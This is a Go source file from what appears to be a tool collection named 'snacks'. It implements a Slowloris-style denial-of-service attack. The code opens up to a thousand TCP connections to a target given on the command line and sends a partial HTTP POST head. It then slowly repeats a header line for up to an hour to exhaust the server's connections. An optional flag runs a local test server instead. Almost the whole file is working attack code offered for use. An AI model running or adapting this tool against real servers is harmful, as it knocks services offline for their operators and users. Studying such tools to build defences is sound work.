package loris

import (
	"flag"
	"net"
	"net/url"
	"os"
	"time"

	"github.com/andrewflbarnes/snacks/pkg/strs"
	"github.com/andrewflbarnes/snacks/pkg/udy"

	"github.com/andrewflbarnes/snacks/internal/helper"
	"github.com/andrewflbarnes/snacks/pkg/http"
	log "github.com/sirupsen/logrus"
)

var (
	logger = log.WithFields(log.Fields{})

	flagsLoris = flag.NewFlagSet("loris", flag.ExitOnError)
	flagOnce   = flagsLoris.Bool("once", false, "Establish a single connection")
	flagTime   = flagsLoris.Duration("time", time.Hour, "How long to run the test for (not applicable if -once enabled)")
	flagTest   = flagsLoris.Bool("test", false, "Runs an embedded server to connect to")
	flagSize   = flagsLoris.Int("size", 1_000_000, "The size of the request payload to send")
	flagDelay  = flagsLoris.Duration("sd", 1*time.Second, "The delay in ms between each send")
	flagMax    = flagsLoris.Int("max", 1000, "The maximum number of connections to establish")
	flagHeader = flagsLoris.String("header", "x-snacks-slow-loris: boom", "The HTTP header to repeat for the attack")

	dest *url.URL
)

func Loris() {
	logFlags := helper.InitLogFlags(flagsLoris)
	flagsLoris.Parse(os.Args[2:])
	logFlags.Apply()

	var urlString string
	if len(flagsLoris.Args()) > 0 {
		urlString = flagsLoris.Args()[0]
	} else {
		urlString = "http://localhost:80"
	}
	dest = helper.ParseUrl(urlString)

	test := *flagTest
	size := *flagSize
	once := *flagOnce
	header := *flagHeader + "\n"
	sendDelay := *flagDelay
	duration := *flagTime
	maxConns := *flagMax

	logger.Info("Starting")

	// Create a new Udy instance
	dataProvider := udy.NewRepeaterDataProvider([]byte(header), size)
	sendStrategy := udy.NewFixedSendStrategy(sendDelay)
	l := udy.NewUdy(dataProvider, sendStrategy, maxConns)

	if test {
		// Start a server which will receive the payload
		serverReady := make(chan bool)
		go helper.HttpServer(dest.Port(), serverReady)
		<-serverReady
	}

	prefix := getPayloadPrefix()

	if once {
		logExecutionDetails("single", prefix)

		executeOnce(l, prefix)

		logger.Info("Loris attack complete")
	} else {
		logExecutionDetails("continuous", prefix)

		go l.ExecuteContinuous(dest, prefix, size)

		time.Sleep(duration)
		// l.Stop()

		logger.WithFields(log.Fields{
			"duration": duration,
		}).Info("Loris attack complete")

		time.Sleep(sendDelay)
	}
}

func logExecutionDetails(execution string, prefix []byte) {
	if strs.IsPrintable(prefix) {
		logger.Infof("Prefix:\n%s", prefix)
	}
	logger.WithFields(log.Fields{
		"type":      execution,
		"target":    dest.Host,
		"size":      *flagSize,
		"duration":  *flagTime,
		"test":      *flagTest,
		"sendDelay": *flagDelay,
		"maxConns":  *flagMax,
		"header":    *flagHeader,
	}).Info("Starting Loris attack")
}

func executeOnce(l udy.Udy, prefix []byte) {
	size := *flagSize
	target := dest.Host

	conn, err := net.Dial("tcp", target)
	if err != nil {
		logger.WithFields(log.Fields{
			"target": target,
		}).Fatal("Unable to establish connection")
	}

	done := l.Execute(conn, prefix, size)
	// Wait for the payload to finish sending
	<-done
}

func getPayloadPrefix() []byte {
	host := dest.Host
	endpoint := dest.Path
	verb := http.Post

	headers := map[string]string{
		"Content-Type":   http.ApplicationJSON.String(),
		"Accept":         "*/*",
		"Content-Length": "1000",
		"Host":           host,
	}

	builder := http.HttpRequestBuilder{
		Proto:    http.Http11,
		Verb:     verb,
		Endpoint: endpoint,
		Body:     "",
		Headers:  headers,
	}

	return []byte(builder.BuildHead())
}
